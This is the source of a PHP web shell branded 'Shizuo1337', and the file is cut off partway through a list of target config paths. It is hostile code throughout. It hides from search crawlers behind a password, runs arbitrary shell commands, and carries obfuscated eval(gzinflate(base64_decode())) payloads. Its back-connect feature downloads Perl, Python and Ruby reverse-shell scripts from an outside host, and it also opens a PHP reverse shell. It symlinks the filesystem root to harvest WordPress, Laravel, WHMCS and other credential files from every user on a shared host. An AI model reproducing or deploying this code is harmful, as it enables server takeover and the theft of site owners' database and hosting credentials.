<?php
@ob_start();
@session_start();
@set_time_limit(0);
@ini_set("max_execution_time", 0);
@ini_set("output_buffering", 0);
error_reporting(0);
ini_set("display_errors", 0);
ini_set("log_errors", 0);
ini_set('error_log', '');
$pass = "93880f28547fd91b76e33484d560f94d129b8aa250d181307107e3af70c05f5b";
$nm = "Janda Olympus";
function prototype($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if(!empty($pass)) {
    if(isset($_POST['pass']) && (hash('sha256', $_POST['pass']) == $pass))
        prototype(md5($_SERVER['HTTP_HOST']), $pass);
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $pass))
        hardLogin();
}

function hardLogin() {
        if(!empty($_SERVER['HTTP_USER_AGENT'])) {
          $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
          if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
          header('HTTP/1.0 404 Not Found');
          exit;
          }
        }
    die('<!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <link rel="shortcut icon" type="image/png" href="https://cdn.shizuosec.id/t7jodwsa35/Shizuosec.webp" /> <style> body { font-family: monospace; } input[type="password"] { border: none; padding: 2px; } input[type="password"]:focus { outline: none; } input[type="submit"] { border: none; padding: 4px 20px; background-color: #2e313d; color: #FFF; } </style> </head> <body> <form action="" method="post"> <div align="center"> <input type="password" name="pass" placeholder=""></div> </form> </body> </html>');}


// logout
if(isset($_GET["logout"])) {
setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);
setcookie('shizuosec', '', time() - 3600);
echo '<script>window.location="'.$_SERVER['PHP_SELF'].'";</script>';
}
if (isset($_GET['action']) && $_GET['action'] == 'download') {
    if (isset($_GET['item'])) {
        $file = $_GET['item'];

        // Mencegah akses file yang tidak diizinkan
        if (is_readable($file) && file_exists($file)) {
            @ob_clean();
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($file).'"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));

            // Baca dan kirim file
            readfile($file);
            exit;
        } else {
            // File tidak ditemukan atau tidak bisa dibaca
            echo "File tidak tersedia.";
        }
    } else {
        // Parameter 'item' tidak ada atau kosong
        echo "Parameter 'item' tidak valid.";
    }
}

function flash($message, $status, $class, $redirect = false) {
    if (!empty($_SESSION["message"])) {
        unset($_SESSION["message"]);
    }
    if (!empty($_SESSION["class"])) {
        unset($_SESSION["class"]);
    }
    if (!empty($_SESSION["status"])) {
        unset($_SESSION["status"]);
    }
    $_SESSION["message"] = $message;
    $_SESSION["class"] = $class;
    $_SESSION["status"] = $status;
    if ($redirect) {
        header('Location: ' . $redirect);
        exit();
    }
    return true;
}

function clear() {
    if (!empty($_SESSION["message"])) {
        unset($_SESSION["message"]);
    }
    if (!empty($_SESSION["class"])) {
        unset($_SESSION["class"]);
    }
    if (!empty($_SESSION["status"])) {
        unset($_SESSION["status"]);
    }
    return true;
}

function writable($path, $perms){
    return (!is_writable($path)) ? "<font color=\"red\">".$perms."</font>" : "<font color=\"lime\">".$perms."</font>";
}

function perms($path) {
    $perms = fileperms($path);
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    }
    elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    }
    elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    }
    elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    }
    elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    }
    elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    }
    elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    }
    else {
        // Unknown
        $info = 'u';
    }

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
    (($perms & 0x0800) ? 's' : 'x' ) :
    (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
    (($perms & 0x0400) ? 's' : 'x' ) :
    (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
    (($perms & 0x0200) ? 't' : 'x' ) :
    (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

function fsize($file) {
    $a = ["B", "KB", "MB", "GB", "TB", "PB"];
    $pos = 0;
    $size = filesize($file);
    while ($size >= 1024) {
        $size /= 1024;
        $pos++;
    }
    return round($size, 2)." ".$a[$pos];
}

if (isset($_GET['dir'])) {
    $path = $_GET['dir'];
    chdir($_GET['dir']);
} else {
    $path = getcwd();
}

$path = str_replace('\\', '/', $path);
$exdir = explode('/', $path);

function getOwner($item) {
    if (function_exists("posix_getpwuid")) {
        $downer = @posix_getpwuid(fileowner($item));
        $downer = $downer['name'];
    } else {
        $downer = fileowner($item);
    }
    if (function_exists("posix_getgrgid")) {
        $dgrp = @posix_getgrgid(filegroup($item));
        $dgrp = $dgrp['name'];
    } else {
        $dgrp = filegroup($item);
    }
    return $downer . '/' . $dgrp;
}

// Another CMD
function nameShiz()
{
    $lockname = $_POST["lockfile"];
    $dirna = getcwd();
    return "250378228542009915036352" . base64_encode($dirna.'/'.$lockname);
}
function handlerNa()
{
    $lockname = $_POST["lockfile"];
    $dirna = getcwd();
    return "304182847327984488423413" . base64_encode($dirna.'/'.$lockname);
}

function exe($cmd) {
if(function_exists('system')) {
    @ob_start();
    @system($cmd);
    $buff = @ob_get_contents();
    @ob_end_clean();
    return $buff;
} elseif(function_exists('exec')) {
    @exec($cmd,$results);
    $buff = "";
foreach($results as $result) {
    $buff .= $result;
    } return $buff;
} elseif(function_exists('passthru')) {
    @ob_start();
    @passthru($cmd);
    $buff = @ob_get_contents();
    @ob_end_clean();
    return $buff;
} elseif(function_exists('shell_exec')) {
    $buff = @shell_exec($cmd);
    return $buff;
} elseif(function_exists("popen")&&function_exists("pclose")) {
    if(is_resource($f = @popen($cmd,"r"))){
    while(!@feof($f))
    $buff .= fread($f,1024);
    pclose($f);
    }
    return $buff;
} elseif(function_exists('proc_open')){
    $pipes = array();
    $process = @proc_open($cmd.' 2>&1', array(array("pipe","w"), array("pipe","w"), array("pipe","w")), $pipes, null);
    $buff = @stream_get_contents($pipes[1]);
    return $buff;
} else {
    return "Unable to execute command";
    }
}

function pwn8($c) {
    eval(gzinflate(base64_decode("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")));
    }

function cmd8($inn)
{
ob_start();
pwn8($inn.' 2>&1');
$outt = ob_get_clean();
return $outt;
}

function pwn7($cmd) {
    eval(gzinflate(base64_decode("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")));
    }

function cmd7($inn)
{
ob_start();
pwn7($inn.' 2>&1');
$outt = ob_get_clean();
return $outt;
}

function fdown($url, $bcname) {
    if (function_exists("curl_exec")) {
$fh = fopen($bcname,'w');
$c = curl_init($url);
curl_setopt($c, CURLOPT_FILE, $fh);
curl_exec($c);
curl_close($c);
} elseif (function_exists("file_get_contents")) {
$fh = file_get_contents($url);
file_put_contents($bcname, $fh);
} else {
    return false;
}
}

// Back Connect
function bctool() {
    if (isset($_POST['ip']) && isset($_POST['port'])) {
        if($_POST['backconnect'] == 'perl') {
    $bca="https://raw.githubusercontent.com/shizuo1337/bc/main/bc.pl";
    $bc=fdown($bca, 'bc.pl');
    $out = exe("perl bc.pl ".$_POST['ip']." ".$_POST['port']." 1>/dev/null 2>&1 &");
    sleep(1);
    echo "<pre>$out\n".exe("ps aux | grep bc.pl")."</pre>";
    unlink("bc.pl");
    }
    if($_POST['backconnect'] == 'python') {
    $becaaa="https://raw.githubusercontent.com/shizuo1337/bc/main/bc.py";
    $becaa=fdown($becaaa, 'bcpyt.py');
    $out1 = exe("python bcpyt.py ".$_POST['ip']." ".$_POST['port']);
    sleep(1);
    echo "<pre>$out1\n".exe("ps aux | grep bcpyt.py")."</pre>";
    unlink("bcpyt.py");
    }
    if($_POST['backconnect'] == 'ruby') {
    $becaaka="https://raw.githubusercontent.com/shizuo1337/bc/main/bc.rb";
    $becaak=fdown($becaaka, 'bcruby.rb');
    $out2 = exe("ruby bcruby.rb ".$_POST['ip']." ".$_POST['port']);
    sleep(1);
    echo "<pre>$out2\n".exe("ps aux | grep bcruby.rb")."</pre>";
    unlink("bcruby.rb");
    }
if($_POST['backconnect'] == 'php') {
            $ip = $_POST['ip'];
            $port = $_POST['port'];
            $sockfd = fsockopen($ip , $port , $errno, $errstr );
            if($errno != 0){
              echo "<font color='red'>$errno : $errstr</font>";
            } else if (!$sockfd)  {
              $result = "<p>Unexpected error has occured, connection may have failed.</p>";
            } else {
              fputs ($sockfd ,"
                \n{################################################################}
                \n..:: BackConnect Php By Shizuo1337 ::..
                \n{################################################################}\n");
              $dir = exe("pwd");
              $sysinfo = exe("uname -a");
              $time = exe("time");
              $len = 1337;
              fputs($sockfd, "User ", $sysinfo, "connected @ ", $time, "\n\n");
              while(!feof($sockfd)){ $cmdPrompt = '[Shizuo1337]#:> ';
              fputs ($sockfd , $cmdPrompt );
              $command= fgets($sockfd, $len);
              fputs($sockfd , "\n" . exe($command) . "\n\n");
            }
            fclose($sockfd);
            }
          }
    } else {
        echo '<!-- back connect -->  ';
        echo '<form action="" method="post">';
        echo '<div class="mb-3">';
        echo '<label class="form-label">Ip</label>';
        echo '<input type="text" class="form-control" name="ip" placeholder="127.0.0.0" required>';
        echo '</div>';
        echo '<div class="mb-3">';
        echo '<label class="form-label">Port</label>';
        echo '<input type="text" class="form-control" name="port" placeholder="1337" required>';
        echo '</div>';
        echo '<div class="mb-3">';
        echo '<label class="form-label">Tipe</label>';
        echo "<select class='form-control' name='backconnect'><option value='perl'>Perl</option><option value='php'>PHP</option><option value='python'>Python</option><option value='ruby'>Ruby</option></select>";
        echo '</div>';
        echo '<button class="btn btn-outline-light text-purple" type="submit">Submit</button>';
        echo '</form>';
    }
}

function getconfig() {
    if ($_POST) {
       if ($_POST['config'] == 'symvhosts') {
        @mkdir("symvhosts", 0777);
        exe("ln -s / symvhosts/root");
        $htaccess = "Options Indexes FollowSymLinks
DirectoryIndex shiz.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
        @file_put_contents("symvhosts/.htaccess", $htaccess);
        $etc_passwd = $_POST['passwd'];
        $etc_passwd = explode("
", $etc_passwd);
        foreach ($etc_passwd as $passwd) {
            $pawd = explode(":", $passwd);
            $user = $pawd[5];
            $jembod = preg_replace('//var/www/vhosts//', '', $user);
            if (preg_match('/vhosts/i', $user)) {
                exe("ln -s " . $user . "/httpdocs/wp-config.php symvhosts/" . $jembod . "-Wordpress.txt");
                exe("ln -s " . $user . "/httpdocs/configuration.php symvhosts/" . $jembod . "-Joomla.txt");
                exe("ln -s " . $user . "/httpdocs/config/koneksi.php symvhosts/" . $jembod . "-Lokomedia.txt");
                exe("ln -s " . $user . "/httpdocs/forum/config.php symvhosts/" . $jembod . "-phpBB.txt");
                exe("ln -s " . $user . "/httpdocs/sites/default/settings.php symvhosts/" . $jembod . "-Drupal.txt");
                exe("ln -s " . $user . "/httpdocs/config/settings.inc.php symvhosts/" . $jembod . "-PrestaShop.txt");
                exe("ln -s " . $user . "/httpdocs/app/etc/local.xml symvhosts/" . $jembod . "-Magento.txt");
                exe("ln -s " . $user . "/httpdocs/admin/config.php symvhosts/" . $jembod . "-OpenCart.txt");
                exe("ln -s " . $user . "/httpdocs/application/config/database.php symvhosts/" . $jembod . "-CodeIgniter.txt");
            }
        }
    }
    if ($_POST['config'] == 'symlink') {
        @mkdir("symconfig", 0777);
        @symlink("/", "symconfig/root");
        $htaccess = "Options Indexes FollowSymLinks
DirectoryIndex shiz.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
        @file_put_contents("symconfig/.htaccess", $htaccess);
    }
    if ($_POST['config'] == '404') {
        @mkdir("sym404", 0777);
        @symlink("/", "sym404/root");
        $htaccess = "Options Indexes FollowSymLinks
DirectoryIndex shiz.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
IndexOptions +Charset=UTF-8 +FancyIndexing +IgnoreCase +FoldersFirst +XHTML +HTMLTable +SuppressRules +SuppressDescription +NameWidth=*
IndexIgnore *.txt404
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} ^.*sym404 [NC]
RewriteRule .txt$ %{REQUEST_URI}404 [L,R=302.NC]";
        @file_put_contents("sym404/.htaccess", $htaccess);
    }
    if ($_POST['config'] == 'grab') {
        mkdir("shizuo_config", 0777);
        $isi_htc = "Options all
Require None
Satisfy Any";
        $htc = fopen("shizuo_config/.htaccess", "w");
        fwrite($htc, $isi_htc);
    }
    $passwd = $_POST['passwd'];
    preg_match_all('/(.*?):x:/', $passwd, $user_config);
    foreach ($user_config[1] as $user_shiz) {
        $grab_config = array("/home/$user_shiz/.accesshash" => "WHM-accesshash", "/home/$user_shiz/.env" => "Laravel", "/home/$user_shiz/whmcs/configuration.php" => "Laravel", "/home/$user_shiz/public_html/config/koneksi.php" => "Lokomedia", "/home/$user_shiz/public_html/forum/config.php" => "phpBB", "/home/$user_shiz/public_html/sites/default/settings.php" => "Drupal", "/home/$user_shiz/public_html/config/settings.inc.php" => "PrestaShop", "/home/$user_shiz/public_html/app/etc/local.xml" => "Magento", "/home/$user_shiz/public_html/admin/config.php" => "OpenCart", "/home/$user_shiz/public_html/application/config/database.php" => "CodeIgniter", "/home/$user_shiz/public_html/vb/includes/config.php" => "Vbulletin", "/home/$user_shiz/public_html/includes/config.php" => "Vbulletin", "/home/$user_shiz/public_html/forum/includes/config.php" => "Vbulletin", "/home/$user_shiz/public_html/forums/includes/config.php" => "Vbulletin", "/home/$user_shiz/public_html/cc/includes/config.php" => "Vbulletin", "/home/$user_shiz/public_html/inc/config.php" => "MyBB", "/home/$user_shiz/public_html/includes/configure.php" => "OsCommerce", "/home/$user_shiz/public_html/shop/includes/configure.php" => "OsCommerce", "/home/$user_shiz/public_html/os/includes/configure.php" => "OsCommerce", "/home/$user_shiz/public_html/oscom/includes/configure.php" => "OsCommerce", "/home/$user_shiz/public_html/products/includes/configure.php" => "OsCommerce", "/home/$user_shiz/public_html/cart/includes/configure.php" => "OsCommerce", "/home/$user_shiz/public_html/inc/conf_global.php" => "IPB", "/home/$user_shiz/public_html/wp-config.php" => "Wordpress", "/home/$user_shiz/public_html/wp/test/wp-config.php" => "Wordpress", "/home/$user_shiz/public_html/blog/wp-config.php" => "Wordpress", "/home/$user_shiz/public_html/beta/wp-config.php" => "Wordpress", "/home/$user_shiz/public_html/portal/wp-config.php" => "Wordpress", "/home/$user_shiz/public_html/site/wp-config.php" => "Wordpress", "/home/$user_shiz/public_html/wp/wp-config.php" => "Wordpress", "/home/$user_shiz/public_html/WP/wp-config.php" => "Wordpress", "/home/$user_shiz/public_html/news/wp-config.php" => "Wordpress", "/home/$user_shiz/public_html/wordpress/wp-config.php" => "Wordpress", "/home/$user_shiz/public_html/test/wp-config.php" => "Wordpress", "/home/$user_shiz/public_html/demo/wp-config.php" => "Wordpress", "/home/$user_shiz/public_html/home/wp-config.php" => "Wordpress", "/home/$user_shiz/public_html/v1/wp-config.php" => "Wordpress", "/home/$user_shiz/public_html/v2/wp-config.php" => "Wordpress", "/home/$user_shiz/public_html/press/wp-config.php" => "Wordpress", "/home/$user_shiz/public_html/new/wp-config.php" => "Wordpress", "/home/$user_shiz/public_html/blogs/wp-config.php" => "Wordpress", "/home/$user_shiz/public_html/configuration.php" => "Joomla", "/home/$user_shiz/public_html/blog/configuration.php" => "Joomla", "/home/$user_shiz/public_html/configuration.php" => "^WHMCS", "/home/$user_shiz/public_html/cms/configuration.php" => "Joomla", "/home/$user_shiz/public_html/beta/configuration.php" => "Joomla", "/home/$user_shiz/public_html/portal/configuration.php" => "Joomla", "/home/$user_shiz/public_html/site/configuration.php" => "Joomla", "/home/$user_shiz/public_html/main/configuration.php" => "Joomla", "/home/$user_shiz/public_html/home/configuration.php" => "Joomla", "/home/$user_shiz/public_html/demo/configuration.php" => "Joomla", "/home/$user_shiz/public_html/test/configuration.php" => "Joomla", "/home/$user_shiz/public_html/v1/configuration.php" => "Joomla", "/home/$user_shiz/public_html/v2/configuration.php" => "Joomla", "/home/$user_shiz/public_html/joomla/configuration.php" => "Joomla", "/home/$user_shiz/public_html/new/configuration.php" => "Joomla", "/home/$user_shiz/public_html/WHMCS/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/whmcs1/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Whmcs/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/whmcs/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/whmcs/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/WHMC/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Whmc/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/whmc/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/WHM/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Whm/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/whm/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/HOST/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Host/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/host/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/SUPPORTES/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Supportes/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/supportes/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/domains/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/domain/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Hosting/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/HOSTING/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/hosting/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/CART/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Cart/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/cart/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/ORDER/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Order/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/order/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/CLIENT/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Client/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/client/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/CLIENTAREA/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Clientarea/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/clientarea/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/SUPPORT/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Support/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/support/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/BILLING/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Billing/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/billing/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/BUY/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Buy/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/buy/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/MANAGE/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Manage/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/manage/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/CLIENTSUPPORT/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/ClientSupport/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Clientsupport/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/clientsupport/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/CHECKOUT/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Checkout/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/checkout/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/BILLINGS/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Billings/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/billings/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/BASKET/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Basket/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/basket/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/SECURE/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Secure/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/secure/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/SALES/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Sales/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/sales/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/BILL/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/Bill/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/bill/configuration.php" => "WHMCS", "/home/$user_shiz/public_html/PURCHASE/configuration.php" => "WHMCS", 